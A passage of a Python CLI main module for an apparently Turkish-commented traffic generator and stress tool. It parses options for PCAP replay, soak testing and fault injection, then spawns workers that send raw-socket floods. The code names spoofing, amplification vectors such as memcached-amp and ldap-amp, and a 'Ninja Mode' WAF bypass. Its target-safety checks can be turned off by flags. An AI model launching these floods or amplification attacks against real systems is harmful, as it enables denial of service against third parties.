    pcap_replay_group.add_argument(
        "--pcap-file", type=str, default="",
        help="PCAP / PCAP-NG dosyası yolu (pcap-replay vektörü için gereklidir).",
    )
    pcap_replay_group.add_argument(
        "--pcap-timing",
        choices=["original", "topspeed", "multiplier", "rps"],
        default="original",
        help="Replay zamanlama modu: original=orijinal gap, topspeed=maks hız, "
             "multiplier=N× hız çarpanı, rps=sabit paket/sn.",
    )
    pcap_replay_group.add_argument(
        "--pcap-speed", type=float, default=1.0,
        help="Hız çarpanı (multiplier modu için). 2.0 = 2× hızlı. Varsayılan: 1.0",
    )
    pcap_replay_group.add_argument(
        "--pcap-loops", type=int, default=1,
        help="PCAP dosyasını kaç kez tekrar oynat (0 = sonsuz). Varsayılan: 1",
    )
    pcap_replay_group.add_argument(
        "--pcap-max-packets", type=int, default=0,
        help="Oynatılacak maksimum paket sayısı (0 = hepsi). Varsayılan: 0",
    )
    pcap_replay_group.add_argument(
        "--pcap-filter-proto", type=str, nargs='+', default=None,
        help="Protokol filtresi (tcp, udp, icmp). Birden fazla belirtilebilir.",
    )
    pcap_replay_group.add_argument(
        "--pcap-filter-src-ip", type=str, default=None,
        help="Kaynak IP filtresi (IP veya CIDR). Örn: 192.168.1.0/24",
    )
    pcap_replay_group.add_argument(
        "--pcap-filter-dst-ip", type=str, default=None,
        help="Hedef IP filtresi (IP veya CIDR).",
    )
    pcap_replay_group.add_argument(
        "--pcap-filter-src-port", type=int, default=None,
        help="Kaynak port filtresi.",
    )
    pcap_replay_group.add_argument(
        "--pcap-filter-dst-port", type=int, default=None,
        help="Hedef port filtresi.",
    )
    pcap_replay_group.add_argument(
        "--pcap-filter-min-len", type=int, default=0,
        help="Minimum paket boyutu filtresi (byte).",
    )
    pcap_replay_group.add_argument(
        "--pcap-filter-max-len", type=int, default=0,
        help="Maksimum paket boyutu filtresi (byte, 0=sınırsız).",
    )
    pcap_replay_group.add_argument(
        "--pcap-strip-eth", action="store_true",
        help="Ethernet başlığını soyup sadece raw IP olarak gönder.",
    )
    pcap_replay_group.add_argument(
        "--pcap-src-ip-override", type=str, default=None,
        help="Tüm paketlerin kaynak IP'sini bu değerle değiştir.",
    )
    pcap_replay_group.add_argument(
        "--pcap-src-port-override", type=int, default=None,
        help="Tüm paketlerin kaynak portunu bu değerle değiştir.",
    )
    pcap_replay_group.add_argument(
        "--pcap-batch-size", type=int, default=512,
        help="Timing-aware modda batch boyutu. Varsayılan: 512",
    )
    pcap_replay_group.add_argument(
        "--pcap-info", action="store_true",
        help="PCAP dosyasının özetini göster ve çık (trafik göndermez).",
    )

    report_group = parser.add_argument_group("Reporting / Self-Test")
    report_group.add_argument(
        "--self-test",
        action="store_true",
        help="Unittest discovery calistir ve cik (trafik gondermez).",
    )
    report_group.add_argument(
        "--run-report",
        action="store_true",
        help="Calisma raporu uret (live + offline/test modlari).",
    )
    report_group.add_argument(
        "--run-report-format",
        choices=["json", "md", "both"],
        default="both",
        help="Run raporu cikti formati.",
    )
    report_group.add_argument(
        "--run-report-out",
        type=str,
        default="",
        help="Run raporu base dosya adi (bossa otomatik). Uzanti eklemeyin (ornek: reports/run_001).",
    )
    report_group.add_argument(
        "--run-report-dir",
        type=str,
        default="reports/runs",
        help="Run raporu cikti dizini (varsayilan: reports/runs).",
    )
    report_group.add_argument(
        "--soak-profile",
        choices=["none", "1h", "6h", "24h"],
        default="none",
        help="Soak test profili (1h/6h/24h) ve varsayilan pass/fail esikleri.",
    )
    report_group.add_argument(
        "--soak-snapshot-interval",
        type=int,
        default=0,
        help="Soak snapshot araligi (s). 0=profile default, aralik 10-30s.",
    )
    report_group.add_argument(
        "--soak-warmup-s",
        type=int,
        default=0,
        help="Soak warm-up suresi (s). 0=profile default; baseline bu sureden sonra kilitlenir.",
    )
    report_group.add_argument("--soak-max-error-rate-pct", type=float, default=None, help="Soak pass/fail: maksimum hata orani (%%).")
    report_group.add_argument("--soak-max-pps-drop-pct", type=float, default=None, help="Soak pass/fail: baseline'e gore maksimum PPS dusus (%%).")
    report_group.add_argument("--soak-max-rss-growth-mb", type=float, default=None, help="Soak pass/fail: maksimum RSS artis limiti (MB).")
    report_group.add_argument("--soak-max-vram-growth-mb", type=float, default=None, help="Soak pass/fail: maksimum VRAM artis limiti (MB).")
    report_group.add_argument("--soak-max-pinned-growth-mb", type=float, default=None, help="Soak pass/fail: maksimum pinned-memory artis limiti (MB).")
    report_group.add_argument("--soak-max-backlog", type=int, default=None, help="Soak pass/fail: maksimum backlog limiti (paket).")
    report_group.add_argument(
        "--loss-telemetry",
        choices=["auto", "0", "1"],
        default="auto",
        help="Wire-loss telemetry modu: auto|0|1 (varsayilan: auto).",
    )
    report_group.add_argument(
        "--loss-iface",
        type=str,
        default="",
        help="Loss telemetry icin arayuz ismi (opsiyonel, bossa otomatik).",
    )
    report_group.add_argument(
        "--loss-fail-pct",
        type=float,
        default=5.0,
        help="Wire-loss fail esigi (%%). Varsayilan: 5.",
    )
    report_group.add_argument(
        "--loss-report-out",
        type=str,
        default="",
        help="Canli run sonunda loss telemetry JSON ciktisi (opsiyonel dosya yolu).",
    )

    fault_group = parser.add_argument_group("Fault Injection")
    fault_group.add_argument(
        "--fault-inject",
        nargs="*",
        choices=["sender-restart", "nic-blip", "gpu-stream-error", "mix"],
        default=[],
        help="Soak test fault senaryolari (simulasyon). Birden fazla verilebilir.",
    )
    fault_group.add_argument(
        "--fault-after-s",
        type=float,
        default=0.0,
        help="Fault injection tetikleme suresi (s). 0=kapali.",
    )
    fault_group.add_argument(
        "--fault-duration-s",
        type=float,
        default=2.0,
        help="Fault simulasyon suresi (s).",
    )

    return parser

def main(argv=None):
    # Setup logging to avoid scapy warnings
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    utils.print_banner()
    _maybe_enable_uvloop()
    parser = build_parser()

    temp_args, _ = parser.parse_known_args(argv)

    defaults_from_config = {}
    if temp_args.config:
        try:
            with open(temp_args.config, 'r', encoding='utf-8') as f:
                config_data = yaml.safe_load(f) or {}
            for main_key, value in config_data.items():
                if isinstance(value, dict):
                    for sub_key, sub_value in value.items():
                        dest = f"{main_key}_{sub_key}".replace('-', '_')
                        defaults_from_config[dest] = sub_value
                else:
                    defaults_from_config[main_key] = value
        except FileNotFoundError:
            utils.log_critical(f"Konfigürasyon dosyası bulunamadı: {temp_args.config}")
            sys.exit(1)
        except Exception as e:
            utils.log_critical(f"Konfigürasyon dosyası okunurken hata: {e}")
            sys.exit(1)
            
    parser.set_defaults(**defaults_from_config)
    args = parser.parse_args(argv)
    _resolve_profile_args(parser, args, argv)

    if getattr(args, "list_profiles", False):
        print_profiles()
        sys.exit(0)

    apply_profile(args)
    _resolve_profile_args(parser, args, argv)
    _validate_pacing_args(parser, args)
    _validate_hybrid_cuda_args(parser, args)

    global CONNECTION_POOL
    try:
        CONNECTION_POOL = max(1, int(args.connection_pool)) 
    except Exception:
        pass # Keep default

    # Unified reporting flags (keep gpu-pcap-specific flags for backwards compatibility).
    want_report = bool(getattr(args, "run_report", False)) or bool(getattr(args, "gpu_pcap_run_report", False))
    report_fmt = str(getattr(args, "run_report_format", getattr(args, "gpu_pcap_run_report_format", "both")))
    report_dir = str(getattr(args, "run_report_dir", "reports/runs"))
    report_base = str(getattr(args, "run_report_out", "")).strip() or str(getattr(args, "gpu_pcap_run_report_out", "")).strip()
    soak_cfg = _build_soak_config(args)
    os.environ["SAMURAI_LOSS_TELEMETRY"] = str(getattr(args, "loss_telemetry", "auto"))
    os.environ["SAMURAI_LOSS_FAIL_PCT"] = str(float(getattr(args, "loss_fail_pct", 5.0) or 5.0))
    loss_iface = str(getattr(args, "loss_iface", "") or "").strip()
    if loss_iface:
        os.environ["SAMURAI_LOSS_IFACE"] = loss_iface
    else:
        os.environ.pop("SAMURAI_LOSS_IFACE", None)
    loss_report_out = str(getattr(args, "loss_report_out", "") or "").strip()
    if loss_report_out:
        os.environ["SAMURAI_LOSS_REPORT_OUT"] = loss_report_out
    else:
        os.environ.pop("SAMURAI_LOSS_REPORT_OUT", None)
    os.environ["SAMURAI_GPU_TEMPLATE_POOL_SIZE_L4"] = str(int(getattr(args, "gpu_template_pool_size_l4", 10) or 10))
    os.environ["SAMURAI_GPU_TEMPLATE_POOL_SIZE_L7"] = str(int(getattr(args, "gpu_template_pool_size_l7", 50) or 50))
    os.environ["SAMURAI_GPU_RING_CAPACITY"] = str(int(getattr(args, "gpu_ring_capacity", 3) or 3))
    os.environ["SAMURAI_GPU_PINNED_MAX_MB"] = str(int(getattr(args, "gpu_pinned_max_mb", 512) or 512))
    os.environ["SAMURAI_GPU_RNG_SEED"] = str(int(getattr(args, "gpu_rng_seed", 1234) or 0))
    os.environ["SAMURAI_STATE_TABLE_SIZE"] = str(int(getattr(args, "state_table_size", 65536) or 65536))
    os.environ["SAMURAI_STATE_LOCK_COUNT"] = str(int(getattr(args, "state_lock_count", 256) or 256))
    os.environ["SAMURAI_STATE_TIMEOUT_SEC"] = str(int(getattr(args, "state_timeout_sec", 60) or 60))
    os.environ["SAMURAI_STATE_SWEEP_INTERVAL_MS"] = str(int(getattr(args, "state_sweep_interval_ms", 1000) or 1000))

    # Live mode reporting is supported as well (aggregated worker events).

    # Self-test: safe mode (no traffic)
    if bool(getattr(args, "self_test", False)):
        try:
            from . import reporting
            from . import selftest
            from . import metrics

            started_utc = datetime.now(timezone.utc).isoformat(timespec="seconds")
            t0 = time.time()
            m = metrics.global_metrics()

            summary = selftest.run_unittest_discover(
                start_dir="tests",
                pattern="test_*.py",
                top_level_dir=None,
                verbosity=2 if bool(args.verbose) else 1,
            )

            finished_utc = datetime.now(timezone.utc).isoformat(timespec="seconds")
            duration_wall = max(0.0, time.time() - t0)

            # Metrics snapshot (offline/test-safe).
            try:
                m.set_gauge("self_test_tests_run", float(summary.get("tests_run", 0) or 0))
                m.set_gauge("self_test_failures", float(summary.get("failures", 0) or 0))
                m.set_gauge("self_test_errors", float(summary.get("errors", 0) or 0))
                m.set_gauge("self_test_skipped", float(summary.get("skipped", 0) or 0))
                m.observe("self_test_wall_s", float(duration_wall))
            except Exception:
                pass

            log_path = None
            if want_report:
                base = report_base or "self_test"
                base_path = os.path.join(os.getcwd(), report_dir, base)
                log_path = reporting.write_text(summary.get("output", ""), base_path + ".log.txt")

                rr = reporting.build_self_test_report(
                    summary=summary,
                    log_path=log_path,
                    duration_s=duration_wall,
                    metrics=m.snapshot(),
                    warnings=[],
                )
                rr.started_utc = started_utc
                rr.finished_utc = finished_utc

                if report_fmt in ("json", "both"):
                    out_json = reporting.write_json(rr, base_path + ".json")
                    utils.log_info(f"Self-test raporu (JSON): {out_json}")
                if report_fmt in ("md", "both"):
                    out_md = reporting.write_markdown(rr, base_path + ".md")
                    utils.log_info(f"Self-test raporu (MD): {out_md}")
                extra = reporting.write_metrics_files(rr, base_path)
                utils.log_info(f"Self-test metrikleri: {extra['metrics_json']}")
                utils.log_info(f"Self-test metrikleri (Prom): {extra['metrics_prom']}")

            if not bool(summary.get("successful", False)):
                utils.log_critical("Self-test basarisiz (fail/error var).")
                sys.exit(1)
            utils.log_info("Self-test OK.")
            sys.exit(0)
        except Exception as e:
            utils.log_critical(f"Self-test hata: {e}")
            sys.exit(1)

    if getattr(args, "gpu_pcap", False):
        try:
            from . import gpu_pcap_gen
            from . import reporting
            from . import metrics

            started_utc = datetime.now(timezone.utc).isoformat(timespec="seconds")
            t0 = time.time()
            m = metrics.global_metrics()

            dst_ip = args.gpu_pcap_dst_ip or args.target or "127.0.0.1"
            tcp_port = args.gpu_pcap_tcp_port or (args.port if args.port else 80)
            udp_port = args.gpu_pcap_udp_port or (args.port if args.port else 53)
            out_name = (
                args.gpu_pcap_out
                or f"gpu_generated_{args.gpu_pcap_duration}s_{args.gpu_pcap_pps}pps.pcap"
            )

            cfg = gpu_pcap_gen.PcapGenConfig(
                duration_s=int(args.gpu_pcap_duration),
                pps=int(args.gpu_pcap_pps),
                mode=str(args.gpu_pcap_mode),
                src_ip=str(args.gpu_pcap_src_ip),
                dst_ip=str(dst_ip),
                tcp_dport=int(tcp_port),
                udp_dport=int(udp_port),
                chunk_size=int(args.gpu_pcap_chunk),
                seed=int(args.gpu_pcap_seed),
                flow_count=int(args.gpu_pcap_flow_count),
                realistic=bool(args.gpu_pcap_realistic),
                udp_checksum=bool(args.gpu_pcap_udp_checksum),
                variable_size=bool(args.gpu_pcap_variable_size),
                mtu=int(args.gpu_pcap_mtu),
                size_profile=str(args.gpu_pcap_size_profile),
                output_filename=str(out_name),
            )

            out_path = gpu_pcap_gen.generate_pcap(cfg, project_dir=os.getcwd())
            utils.log_info(f"GPU PCAP kaydedildi: {out_path}")
            try:
                st = os.stat(out_path)
                m.set_gauge("gpu_pcap_size_bytes", float(getattr(st, "st_size", 0) or 0))
            except Exception:
                pass

            realism_report = None
            realism_path = None
            if bool(args.gpu_pcap_realism_report):
                baseline = str(args.gpu_pcap_realism_baseline).strip() or None
                report_name = (
                    str(args.gpu_pcap_realism_out).strip()
                    or f"{os.path.splitext(out_name)[0]}.realism.json"
                )
                realism_report, realism_path = gpu_pcap_gen.generate_realism_report(
                    out_path,
                    mode=str(args.gpu_pcap_mode),
                    size_profile=str(args.gpu_pcap_size_profile),
                    realistic=bool(args.gpu_pcap_realistic),
                    baseline_pcap=baseline,
                    sample_packets=int(args.gpu_pcap_realism_sample),
                    output_filename=report_name,
                    project_dir=os.getcwd(),
                )
                utils.log_info(f"GPU PCAP gerçekçilik skoru (V3): {realism_report['overall_score']:.2f}/100")
                if realism_path:
                    utils.log_info(f"GPU PCAP gerçekçilik raporu: {realism_path}")

            # Optional customer-facing run report (offline/test mode only)
            if bool(want_report):
                finished_utc = datetime.now(timezone.utc).isoformat(timespec="seconds")
                duration_wall = max(0.0, time.time() - t0)
                try:
                    m.set_gauge("gpu_pcap_duration_s_cfg", float(getattr(cfg, "duration_s", 0) or 0))
                    m.set_gauge("gpu_pcap_pps_cfg", float(getattr(cfg, "pps", 0) or 0))
                    m.observe("gpu_pcap_wall_s", float(duration_wall))
                except Exception:
                    pass
                rr = reporting.build_gpu_pcap_report(
                    cfg=cfg,
                    pcap_path=str(out_path),
                    realism=realism_report,
                    realism_path=str(realism_path) if realism_path else None,
                    duration_s=duration_wall,
                    metrics=m.snapshot(),
                    warnings=[],
                )
                rr.started_utc = started_utc
                rr.finished_utc = finished_utc

                base = report_base or f"{os.path.splitext(out_name)[0]}.run"
                base_path = os.path.join(os.getcwd(), report_dir, base)
                if report_fmt in ("json", "both"):
                    out_json = reporting.write_json(rr, base_path + ".json")
                    utils.log_info(f"Run raporu (JSON): {out_json}")
                if report_fmt in ("md", "both"):
                    out_md = reporting.write_markdown(rr, base_path + ".md")
                    utils.log_info(f"Run raporu (MD): {out_md}")
                extra = reporting.write_metrics_files(rr, base_path)
                utils.log_info(f"Run metrikleri: {extra['metrics_json']}")
                utils.log_info(f"Run metrikleri (Prom): {extra['metrics_prom']}")
            sys.exit(0)
        except Exception as e:
            utils.log_critical(f"GPU PCAP üretimi başarısız: {e}")
            sys.exit(1)

    # PCAP Info: quick summary (no traffic)
    if getattr(args, "pcap_info", False):
        pcap_file = getattr(args, "pcap_file", "") or ""
        if not pcap_file:
            parser.error("Hata: --pcap-info için --pcap-file gereklidir.")
        try:
            from . import pcap_replay as _pcap_mod
            summary = _pcap_mod.pcap_summary(pcap_file)
            utils.log_info("\n── PCAP Dosya Özeti ──")
            for k, v in summary.items():
                if isinstance(v, dict):
                    utils.log_info(f"  {k}:")
                    for sk, sv in v.items():
                        utils.log_info(f"    {sk}: {sv}")
                else:
                    utils.log_info(f"  {k}: {v}")
            sys.exit(0)
        except Exception as e:
            utils.log_critical(f"PCAP özeti alınamadı: {e}")
            sys.exit(1)

    # Dry-run: safe mode (no traffic). Must happen before root checks/orchestrator import.
    if bool(getattr(args, "dry_run", False)):
        utils.log_warning("--- DRY RUN MODE ---")
        try:
            from . import reporting
            from . import metrics

            if args.target is None or args.port is None:
                parser.error("Hata: 'target' ve 'port' argümanları ya komut satırında ya da konfigürasyon dosyasında belirtilmelidir.")

            started_utc = datetime.now(timezone.utc).isoformat(timespec="seconds")
            t0 = time.time()
            m = metrics.global_metrics()
            warnings = []

            payload_obj = None
            payload_source = "none"
            payload_len = 0
            if getattr(args, "payload_file", ""):
                try:
                    with open(args.payload_file, "rb") as f:
                        payload_obj = f.read() or None
                    payload_source = "payload_file"
                    payload_len = len(payload_obj or b"")
                except FileNotFoundError:
                    utils.log_critical(f"Payload dosyası bulunamadı: {args.payload_file}")
                    sys.exit(1)
            elif getattr(args, "payload", ""):
                payload_obj = args.payload
                payload_source = "payload_arg"
                payload_len = len(str(payload_obj))

            spoof_opts = packet.SpoofingOptions(
                mode=args.spoof_mode,
                subnet=args.spoof_subnet,
                list_file=args.spoof_list_file,
            )
            p_config = packet.PacketConfig(
                target_ip=args.target,
                target_port=args.port,
                protocol=args.protocol,
                spoof=args.spoof,
                spoof_opts=spoof_opts,
                payload=payload_obj,
                tcp_flags=args.tcp_flags,
                ttl=args.ttl,
                tos=args.tos,
                window=args.window,
                fragment_enabled=args.fragment,
                fragment_size=args.fragment_size,
                pad_size=args.pad,
                attack_vector=args.attack_vector,
                dns_name=args.dns_name,
                dns_qtype=args.dns_qtype,
                dns_edns=args.dns_edns,
                dns_recursive=not args.dns_nord,
            )
            pkt_bytes = b""
            try:
                pkt = packet.create_packet(p_config)
                pkt_bytes = bytes(pkt)
                utils.log_info(f"Örnek paket üretildi: {len(pkt_bytes)} bayt. (attack_vector={args.attack_vector})")
            except Exception as e:
                # In restricted environments, scapy import/init may fail.
                # Dry-run should still be able to emit a report (if requested).
                warnings.append(f"sample_packet_unavailable: {type(e).__name__}: {e}")
                utils.log_warning(f"Dry-run: örnek paket üretilemedi (scapy/ortam kısıtı olabilir): {e}")
                if not bool(want_report):
                    raise

            finished_utc = datetime.now(timezone.utc).isoformat(timespec="seconds")
            duration_wall = max(0.0, time.time() - t0)
            try:
                m.set_gauge("dry_run_sample_packet_len", float(len(pkt_bytes)))
                m.set_gauge("dry_run_payload_len", float(payload_len))
                m.observe("dry_run_wall_s", float(duration_wall))
            except Exception:
                pass

            # Dry-run report: no network traffic, safe to report.
            if bool(want_report):
                args_for_report = {
                    "target": args.target,
                    "port": int(args.port),
                    "protocol": str(args.protocol),
                    "attack_vector": str(args.attack_vector),
                    "compute_backend": str(getattr(args, "compute_backend", "")),
                    "spoof": bool(args.spoof),
                    "spoof_mode": str(args.spoof_mode),
                    "fragment": bool(args.fragment),
                    "fragment_size": int(args.fragment_size),
                    "pad": int(args.pad),
                    "payload_source": payload_source,
                    "payload_len": int(payload_len),
                }
                rr = reporting.build_dry_run_report(
                    args=args_for_report,
                    packet_len=len(pkt_bytes),
                    packet_hex_prefix=pkt_bytes[:64].hex(),
                    duration_s=duration_wall,
                    metrics=m.snapshot(),
                    warnings=warnings,
                )
                rr.started_utc = started_utc
                rr.finished_utc = finished_utc

                base = report_base or "dry_run"
                base_path = os.path.join(os.getcwd(), report_dir, base)
                if report_fmt in ("json", "both"):
                    out_json = reporting.write_json(rr, base_path + ".json")
                    utils.log_info(f"Dry-run raporu (JSON): {out_json}")
                if report_fmt in ("md", "both"):
                    out_md = reporting.write_markdown(rr, base_path + ".md")
                    utils.log_info(f"Dry-run raporu (MD): {out_md}")
                extra = reporting.write_metrics_files(rr, base_path)
                utils.log_info(f"Dry-run metrikleri: {extra['metrics_json']}")
                utils.log_info(f"Dry-run metrikleri (Prom): {extra['metrics_prom']}")
            sys.exit(0)
        except SystemExit:
            raise
        except Exception as e:
            utils.log_critical(f"Dry-run hata: {e}")
            sys.exit(1)

    if args.target is None or args.port is None:
        parser.error("Hata: 'target' ve 'port' argümanları ya komut satırında ya da konfigürasyon dosyasında belirtilmelidir.")

    # Basic consistency: some vectors require specific backends.
    if args.attack_vector == "anomaly" and args.compute_backend != "cuda":
        parser.error("Hata: 'anomaly' attack-vector yalnızca --compute-backend cuda ile desteklenir.")

    # PCAP Replay consistency: require --pcap-file
    if args.attack_vector == "pcap-replay":
        pcap_file = getattr(args, "pcap_file", "") or ""
        if not pcap_file or not os.path.isfile(pcap_file):
            parser.error("Hata: 'pcap-replay' attack-vector için geçerli bir --pcap-file gereklidir.")

    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        filename=args.log,
        level=log_level,
        format='[%(asctime)s] [%(levelname)s] [%(processName)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    logging.info("Ana süreç başlatıldı.")
    
    # Check for root privileges based on the actual send path.
    _CPU_RAW_SOCKET_VECTORS = {
        "basic", "dns", "anomaly",
        "ntp-amp", "ssdp-amp", "dns-amp", "memcached-amp", "ldap-amp",
        "pcap-replay",
    }
    needs_root = (
        (args.attack_vector in _CPU_RAW_SOCKET_VECTORS)
        or _is_cuda_raw_vector(args)
        or bool(getattr(args, "use_so_txtime", False))
    )
    if needs_root and not is_admin():
        utils.log_critical("Hata: Bu saldırı vektörü raw socket gerektirdiği için ROOT (sudo) yetkisi gereklidir.")
        utils.log_info(
            f"Vektör: {args.attack_vector} (backend={args.compute_backend}, so_txtime={int(bool(args.use_so_txtime))})"
        )
        utils.log_info("Lütfen aracı 'sudo' ile çalıştırın veya 'CAP_NET_RAW' yetkisini verin.")
        sys.exit(1)

    # LAZY IMPORT: Import orchestrator only when needed to prevent premature CUDA init.
    from . import orchestrator
    
    payloads = []
    if args.payload_file:
        try:
            # Open in binary mode to handle non-UTF-8 payloads
            with open(args.payload_file, 'rb') as f:
                # Read the whole file as a single payload chunk
                payload_chunk = f.read()
                if payload_chunk:
                    payloads = [payload_chunk]
            if not payloads:
                utils.log_warning(f"Payload dosyası ({args.payload_file}) boş.")
            else:
                utils.log_info(f"{len(payloads[0])} bayt boyutunda payload dosyadan okundu.")
        except FileNotFoundError:
            utils.log_critical(f"Payload dosyası bulunamadı: {args.payload_file}")
            sys.exit(1)
        except Exception as e:
            utils.log_critical(f"Payload dosyası okunurken hata: {e}")
            sys.exit(1)
    elif args.payload:
        payloads = [args.payload]
    
    args.payloads = payloads

    apply_profile(args)
    _resolve_profile_args(parser, args, argv)
    print_distributed_info(args.role)

    utils.print_system_status(args)
    utils.log_info(f"Saldırı başlatılıyor...")
    # ... (logging and info printing) ...

    tls_profile = args.tls_profile if hasattr(args, "tls_profile") else PROFILE_NONE
    h2_profile = args.h2_profile if hasattr(args, "h2_profile") else PROFILE_NONE
    args.ja3_profile = tls_profile
    args.tls_profile = tls_profile
    args.h2_profile = h2_profile

    if bool(getattr(args, "stealth_mode", False)):
        utils.log_warning("DEPRECATION: --stealth-mode davranissiz (no-op) ve kaldirilacak.")
    if getattr(args, "evasion_techniques", None):
        utils.log_warning("DEPRECATION: --evasion-techniques davranissiz (no-op) ve kaldirilacak.")

    # WAF Bypass (Ninja Mode)
    if args.ninja_mode:
        utils.log_info("Ninja Mode: WAF Bypass başlatılıyor...")
        # Construct target URL from args
        target_scheme = args.http_scheme if hasattr(args, 'http_scheme') else 'http'
        target_path = args.http_path[0] if hasattr(args, 'http_path') and args.http_path else '/'
        target_url = f"{target_scheme}://{args.target}:{args.port}{target_path}"
        
        try:
            bypass_result = asyncio.run(stealth.WAFBypass(target_url, headless=True).bypass())
            
            if bypass_result:
                args.cookies = bypass_result['cookies']
                args.user_agent = bypass_result['user_agent']
                utils.log_info(f"Ninja Mode: Bypass başarılı. Cookies ve User-Agent worker'lara dağıtılıyor.")
            else:
                utils.log_critical("Ninja Mode: WAF Bypass başarısız oldu. Saldırı iptal ediliyor.")
                sys.exit(1)
        except Exception as e:
            utils.log_critical(f"Ninja Mode Hatası: {e}")
            sys.exit(1)
    else:
        args.cookies = None
        args.user_agent = None

    # Safety gates (non-interactive bypass: --confirm)
    if not args.confirm:
        utils.ethical_warning()

    ok, msg = utils.validate_target_safety(
        target_ip=args.target,
        allow_targets=args.allow_target,
        allow_public=args.allow_public_target,
    )
    if not ok:
        utils.log_critical(msg)
        sys.exit(2)

    # Shared runtime state.
    progress = multiprocessing.Value('L', 0)
    sent_total_shared = multiprocessing.Value('L', 0)
    errors_total_shared = multiprocessing.Value('L', 0)
    progress_lock = multiprocessing.Lock()
    manager = multiprocessing.Manager()
    run_events = manager.list()
    resource_stats = manager.dict()

    workers = args.workers if args.workers > 0 else multiprocessing.cpu_count()
    total_count = args.count
    if total_count < workers:
        workers = total_count
        utils.log_warning(f"Toplam paket sayısı ({total_count}), işçi sayısından ({args.workers}) az. İşçi sayısı {total_count} olarak ayarlandı.")

    count_per_worker = total_count // workers if workers > 0 else 0
    worker_counts = [count_per_worker] * workers
    remainder = total_count % workers if workers > 0 else 0
    for i in range(remainder):
        worker_counts[i] += 1

    utils.log_info(f"{workers} adet işçi (worker) süreci başlatılıyor...")
    
    processes = []
    start_time = time.time()
    started_utc = datetime.now(timezone.utc).isoformat(timespec="seconds")
    interrupted = False
    monitor_summary = {}

    # Start worker processes (no loud progress bar). A smooth live monitor will show concise status.
    for i in range(workers):
        if worker_counts[i] == 0:
            continue

        worker_args = argparse.Namespace(**vars(args))
        worker_args.count = worker_counts[i]

        if worker_args.rps > 0:
            worker_args.rps = worker_args.rps / workers

        # Pass args as a dict to ensure process isolation
        p = multiprocessing.Process(
            target=orchestrator.start_worker,
            args=(
                i + 1,
                vars(worker_args),
                progress,
                progress_lock,
                tls_profile,
                run_events,
                sent_total_shared,
                errors_total_shared,
                resource_stats,
            ),
            name=f"Worker-{i+1}",
        )
        processes.append(p)
        p.start()

    try:
        # Use the new smooth live monitor from utils (updates a compact panel)
        monitor_summary = utils.attack_live_monitor(
            processes,
            progress,
            progress_lock,
            total_count,
            refresh=0.25,
            sent_total=sent_total_shared,
            errors_total=errors_total_shared,
            resource_stats=resource_stats,
            soak_config=soak_cfg,
        )

        # Wait for workers to finish cleanly
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        utils.log_critical("CTRL+C algılandı! Tüm süreçler sonlandırılıyor...")
        interrupted = True
    finally:
        for p in processes:
            if p.is_alive():
                p.terminate()
            p.join()
        utils.log_info("Tüm süreçler sonlandırıldı.")
    
    duration = time.time() - start_time
    utils.log_info(f"Tüm işçiler görevlerini tamamladı. Toplam süre: {duration:.2f} saniye.")
    if soak_cfg is not None:
        soak_passed = bool((monitor_summary or {}).get("passed", False))
        alarms_count = int(len((monitor_summary or {}).get("alarms", [])))
        status_txt = "PASS" if soak_passed else "FAIL"
        utils.log_info(
            f"Soak değerlendirme [{soak_cfg.get('profile','custom')}]: {status_txt} "
            f"(alarms={alarms_count}, snapshots={int((monitor_summary or {}).get('snapshot_count', 0))})."
        )

    # Optional run report for live attacks.
    if bool(want_report):
        try:
            from . import reporting
            from . import metrics

            finished_utc = datetime.now(timezone.utc).isoformat(timespec="seconds")
            with progress_lock:
                progress_total = int(progress.value)

            events_local = list(run_events)
            agg = _aggregate_worker_events(events_local)

            m = metrics.global_metrics()
            try:
                m.set_gauge("live_workers_total", float(agg.get("workers_total", 0)))
                m.set_gauge("live_workers_ok", float(agg.get("workers_ok", 0)))
                m.set_gauge("live_workers_failed", float(agg.get("workers_failed", 0)))
                m.set_gauge("live_workers_interrupted", float(agg.get("workers_interrupted", 0)))
                m.set_gauge("live_attempted_total", float(agg.get("attempted_total", 0)))
                m.set_gauge("live_sent_total", float(agg.get("sent_total", 0)))
                m.set_gauge("live_errors_total", float(agg.get("errors_total", 0)))
                m.set_gauge("live_progress_total", float(progress_total))
                m.observe("live_wall_s", float(duration))
                if duration > 0:
                    m.set_gauge("live_effective_pps", float(agg.get("sent_total", 0)) / float(duration))
                if soak_cfg is not None:
                    m.set_gauge("soak_enabled", 1.0)
                    m.set_gauge("soak_passed", 1.0 if bool((monitor_summary or {}).get("passed", False)) else 0.0)
                    m.set_gauge("soak_alarms_total", float(len((monitor_summary or {}).get("alarms", []))))
                    m.set_gauge("soak_snapshots_total", float((monitor_summary or {}).get("snapshot_count", 0) or 0))
            except Exception:
                pass

            warnings = []
            if interrupted:
                warnings.append("run_interrupted_by_user")
            if int(agg.get("workers_failed", 0)) > 0:
                warnings.append("one_or_more_workers_failed")
            if soak_cfg is not None and not bool((monitor_summary or {}).get("passed", False)):
                warnings.append("soak_pass_fail_violation")
            for alarm in list((monitor_summary or {}).get("alarms", []) or []):
                code = str(alarm.get("code", "")).strip()
                if code:
                    warnings.append(f"soak_alarm:{code}")

            rr = reporting.build_live_attack_report(
                args=_report_inputs_from_args(args),
                worker_events=events_local,
                duration_s=float(duration),
                progress_total=int(progress_total),
                total_count=int(total_count),
                metrics=m.snapshot(),
                warnings=warnings,
            )
            rr.started_utc = started_utc
            rr.finished_utc = finished_utc
            if soak_cfg is not None:
                rr.results["soak_profile"] = str(soak_cfg.get("profile", "custom"))
                rr.results["soak_passed"] = bool((monitor_summary or {}).get("passed", False))
                rr.results["soak_snapshot_count"] = int((monitor_summary or {}).get("snapshot_count", 0) or 0)
                rr.results["soak_alarms"] = list((monitor_summary or {}).get("alarms", []) or [])
                rr.results["soak_thresholds"] = dict((monitor_summary or {}).get("thresholds", {}) or {})
                rr.results["soak_baseline"] = dict((monitor_summary or {}).get("baseline", {}) or {})

            base = report_base or f"live_{int(start_time)}"
            base_path = os.path.join(os.getcwd(), report_dir, base)
            if soak_cfg is not None and (monitor_summary or {}).get("snapshots"):
                snapshots_out = reporting.write_text(
                    json.dumps((monitor_summary or {}).get("snapshots", []), indent=2, sort_keys=True),
                    base_path + ".soak.snapshots.json",
                )
                rr.artifacts.append(
                    reporting.Artifact(
                        kind="soak_snapshots_json",
                        path=snapshots_out,
                        meta={"snapshots": int((monitor_summary or {}).get("snapshot_count", 0) or 0)},
                    )
                )
